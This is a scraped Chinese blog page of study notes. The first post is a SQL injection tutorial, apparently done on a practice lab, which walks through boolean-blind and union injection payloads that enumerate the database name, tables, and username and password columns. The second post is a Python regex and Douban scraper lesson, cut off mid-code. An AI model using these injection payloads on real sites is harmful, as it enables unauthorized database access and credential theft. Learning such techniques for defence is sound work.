<p>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<p>#SQL注入的类型</p>
<p>1.布尔盲注</p>
<p>2.union注入</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="*布尔盲注"></a>*布尔盲注</h4><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p>
<ul>
<li>ascii() 函数，返回字符ascii码值   <ul>
<li>参数 : <code>str</code>单字符</li>
</ul>
</li>
<li>length() 函数，返回字符串的长度   <ul>
<li>参数 : <code>str</code> 字符串</li>
</ul>
</li>
<li>left() 函数，返回从左至右截取固定长度的字符串   <ul>
<li>参数<code>str</code>,<code>length</code></li>
<li><code>str</code> : 字符串</li>
<li><code>length</code>：截取长度</li>
</ul>
</li>
<li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串   <ul>
<li>参数，<code>str</code>，<code>pos</code>，<code>length</code></li>
<li><code>str</code>: 字符串</li>
<li><code>pos</code>：开始位置</li>
<li><code>length</code>： 截取长度</li>
</ul>
</li>
</ul>
<h6 id="判断是否存在盲注"><a href="#判断是否存在盲注" class="headerlink" title="#判断是否存在盲注"></a>#判断是否存在盲注</h6><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110351443.png"></p>
<p>*给id赋值显示正常 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输入的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.........</span><br></pre></td></tr></table></figure>

<p>*当给他输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110753465.png"></p>
<p>*没有出现任何即不存在union注入</p>
<p>*当再次输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输出的结果与之前的一样,显示正常,即and后面的为真</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111019672.png"></p>
<p>*假如输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;2</span><br></pre></td></tr></table></figure>

<p> *猜测:单引号表示判断and后面的语句,1=2 为假,即输出</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111419279.png"></p>
<p>*当输入为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输出的为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111721482.png"></p>
<p>*也没有出现任何结果,即猜测错误</p>
<p>*可知 如果输入的为数字型,单引号把前面的单引号闭合,后面就会多出来一个单引号,因此我们要采用注释的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112306033.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112456751.png"></p>
<p>*即确定存在sql注入</p>
<p>*用order by 查询字符段长度，长度为3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;order by 3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112839178.png"></p>
<p>*使用union查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,12,3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120438808.png"></p>
<p>*再输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,user(),3--+</span><br></pre></td></tr></table></figure>

<p>能发现查询的user()能在数据库里面正常运行，但在页面返回是看不到的</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120752304.png"></p>
<p>*因此需要用到布尔盲注</p>
<p>*获取数据库的长度（使用到length函数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115121419317.png"></p>
<p>*运行正常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))&gt;5--+</span><br></pre></td></tr></table></figure>

<p>*根据length函数，可知数据库的长度大于5，可根据这种方法测试出数据库长度</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115123824774.png"></p>
<p>*获取数据库的名字（使用到substr函数、ascii函数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and substr(database(),1,1)--+</span><br></pre></td></tr></table></figure>

<p>*(database(),1,1):“1，1”表示从数据库名字第一位开始，取出一位数据</p>
<p>使用ascii对取出来的数据进行比较</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and ascii(substr(database(),1,1))&gt;1--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115125343574.png"></p>
<p>*获取表的数量（count函数、information_schema）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())--+</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130520941.png"></p>
<p>*使用比较方法判断出表的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130641184.png"></p>
<h4 id="Union注入"><a href="#Union注入" class="headerlink" title="*Union注入"></a>*Union注入</h4><p>database()：当前网站使用的数据库<br>version()：当前mysql的版本<br>user()：当前mysql的用户</p>
<h6 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="#判断是否存在sql注入"></a>#判断是否存在sql注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1  --返回true，显示正常</span><br><span class="line">and 1&#x3D;2  --返回false，显示错误</span><br></pre></td></tr></table></figure>

<h6 id="union查询"><a href="#union查询" class="headerlink" title="#union查询"></a>#union查询</h6><p>*联合查询猜表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,……,7 from users </span><br></pre></td></tr></table></figure>

<p>*联合查询猜列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,username,4,5,password,7 </span><br></pre></td></tr></table></figure>

<p>*获取数据库库名、版本号、用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database(),version(),user(),6,7</span><br></pre></td></tr></table></figure>

<p>*得到数据库库名后查当前数据库表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select  column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br></pre></td></tr></table></figure>

<p>*查数据，假设查到的列名分别为：id，username，password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password from table_name&#x3D;&#39;user&#39;;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" data-id="ckhj6b9y70000osv3foi1hnkl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/" class="article-date">
  <time datetime="2020-11-09T16:00:00.000Z" itemprop="datePublished">2020-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/">正则提取</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="正则表达式的常用操作符"><a href="#正则表达式的常用操作符" class="headerlink" title="*正则表达式的常用操作符"></a>*正则表达式的常用操作符</h3><table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">说明</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">表示任何单个字符</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">[  ]</td>
<td align="center">字符集，对单个字符给出范围取值范围</td>
<td align="center">[abc]表示a、b、c, [a-z]表示a到z单个字符</td>
</tr>
<tr>
<td align="center">[^  ]</td>
<td align="center">非字符集，对单个字符给出排除范围</td>
<td align="center">[^abc]表示非a或b或c的单个字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">前一个字符0次或无限次扩展</td>
<td align="center">abc*表示ab、abc、abcc、abccc等</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">前一个字符1次或无限次扩展</td>
<td align="center">abc+表示abc、abcc、abccc等</td>
</tr>
<tr>
<td align="center">？</td>
<td align="center">前一个字符0次或1次扩展</td>
<td align="center">abc?表示ab、abc</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">左右表达式任意一个</td>
<td align="center">abc|def 表示abc、def</td>
</tr>
<tr>
<td align="center">{m}</td>
<td align="center">扩展前一个字符m次</td>
<td align="center">ab{2}c表示abbc</td>
</tr>
<tr>
<td align="center">{m,n}</td>
<td align="center">扩展前一个字符m至n次（含n）</td>
<td align="center">ab{1,2}c表示abc、abbc</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配字符串开头</td>
<td align="center">^abc表示abc且在一个字符串的开头</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">匹配字符串结尾</td>
<td align="center">abc$表示abc且在一个字符串的结尾</td>
</tr>
<tr>
<td align="center">（ ）</td>
<td align="center">分组标记，内部只能用 | 操作符</td>
<td align="center">（abc）表示abc , (abc|def)表示abc、def</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">数字，等价于[0-9]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">单词字符，等价于[A-Za-z0-9]</td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="*Re库主要功能函数"></a>*Re库主要功能函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.search()</td>
<td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
</tr>
<tr>
<td align="center">re.match()</td>
<td align="center">从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
</tr>
<tr>
<td align="center">re.findall()</td>
<td align="center">搜索字符串，以列表类型返回全部匹配的子串</td>
</tr>
<tr>
<td align="center">re.split()</td>
<td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
</tr>
<tr>
<td align="center">re.findter()</td>
<td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td>
</tr>
<tr>
<td align="center">re.sub()</td>
<td align="center">在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
</tr>
</tbody></table>
<h6 id="正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（-）它们来指定。如re-I-re-M被设置成-I-和-M-标志："><a href="#正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（-）它们来指定。如re-I-re-M被设置成-I-和-M-标志：" class="headerlink" title="*正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（|）它们来指定。如re.I|re.M被设置成  I 和 M  标志："></a>*正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（|）它们来指定。如re.I|re.M被设置成  I 和 M  标志：</h6><table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="center">re.L</td>
<td align="center">使本地化识别（locate-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响^和$</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">使.匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符，这个标志影响\w,\W,\b,\B</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td>
</tr>
</tbody></table>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="正则表达式：字符串模式（判断字符串是否符合一定的标准）"><a href="#正则表达式：字符串模式（判断字符串是否符合一定的标准）" class="headerlink" title="*正则表达式：字符串模式（判断字符串是否符合一定的标准）"></a>*正则表达式：字符串模式（判断字符串是否符合一定的标准）</h4><p>#引入模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>

<p>*创建模式对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pat &#x3D; re.compile(&quot;AA&quot;) </span><br></pre></td></tr></table></figure>

<p>*此处AA是正则表达式，用来去验证其他的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pat.search(&quot;CBA&quot;)</span><br></pre></td></tr></table></figure>

<p>*search字符串被校验的内容</p>
<h6 id="全部代码"><a href="#全部代码" class="headerlink" title="*全部代码"></a>*全部代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)   </span><br><span class="line">m &#x3D;pat.search(&quot;CBA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*运行结果</p>
<p>*None:表示没有找到能够匹配的字符串</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108224356860.png"></p>
<p>*又如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)   </span><br><span class="line">m &#x3D;pat.search(&quot;ABCAA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*运行结果</p>
<p>*匹配到的字符串在（3，5）下标处，（3，5）集合为左闭右开，因此匹配到的字符串在第3、4下标处。</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108231504129.png"></p>
<p>*例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)  </span><br><span class="line">m &#x3D;pat.search(&quot;AABCAADDCCAAA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*search方法，进行比对查找，只能找到第一个字符串位置</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108232222675.png"></p>
<p>#没有模式对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">m &#x3D; re.search(&quot;asd&quot;,&quot;Aasd&quot;)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*前面的字符串是规则（模板）—“asd”，后面的字符串是被校验的对象—“Aasd”</p>
<p>*运行结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108233329120.png"></p>
<p>#re.findall()</p>
<p>*一个字母一个字母匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.findall(&quot;[A-Z]&quot;, &quot;AsdsdfaQa&quot;))</span><br></pre></td></tr></table></figure>

<p>*re.findall(“规矩”，“校验的对象”)</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108234336841.png"></p>
<p>*组合输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.findall(&quot;[A-Z]+&quot;, &quot;ASDsdfQWEaQa&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108235005131.png"></p>
<p>#re.sub()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.sub(&quot;a&quot;,&quot;A&quot;,&quot;aasdhefuigewadsh&quot;))</span><br></pre></td></tr></table></figure>

<p>*”a”表示在校验对象中的字符，“A”表示将”a”替换成”A”</p>
<p>*输出结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108235525101.png"></p>
<p>#要点：建议在正则表达式中，被比较的字符串前面加上r,不用担心转义字符的问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">a&#x3D;r&quot;\aasdsf-\&#39;&quot;</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109000000621.png"></p>
<h4 id="正则提取"><a href="#正则提取" class="headerlink" title="*正则提取"></a>*正则提取</h4><p>*源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request,urllib.error  </span><br><span class="line">from bs4 import BeautifulSoup  </span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line"></span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line"></span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0, 10):   </span><br><span class="line">        url &#x3D; baseurl + str(i * 25)</span><br><span class="line">        html &#x3D; askURL(url)  </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">           print(item)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123;      </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">       # print(html)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line"></span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:  </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*爬取到的内容为豆瓣top250 电影的内容</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109131801726.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109131856192.png"></p>
<p>*使用 re</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>

<p>*在主函数中定义一个正则提取的规则，创建对象如：</p>
<p>1.查找链接规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findlink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)   </span><br></pre></td></tr></table></figure>

<p>*全部代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import re   </span><br><span class="line">import urllib.request,urllib.error </span><br><span class="line">from bs4 import BeautifulSoup   </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line">findlink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)</span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,25):  </span><br><span class="line">        url &#x3D; baseurl + str(i*25)</span><br><span class="line">        html &#x3D; askURL(url) </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">         data &#x3D;  [] </span><br><span class="line">         item &#x3D; str(item)</span><br><span class="line">         link &#x3D; re.findall(findlink, item)[0]</span><br><span class="line">        print(link)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123; </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;: </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*查找到的链接</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201110135514825.png"></p>
<p>2.查找图片规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findImgSrc&#x3D; re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) </span><br></pre></td></tr></table></figure>

<p> *re.S让换行符包含在字符中</p>
<p>*全部代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import re   </span><br><span class="line">import urllib.request,urllib.error </span><br><span class="line">from bs4 import BeautifulSoup   </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    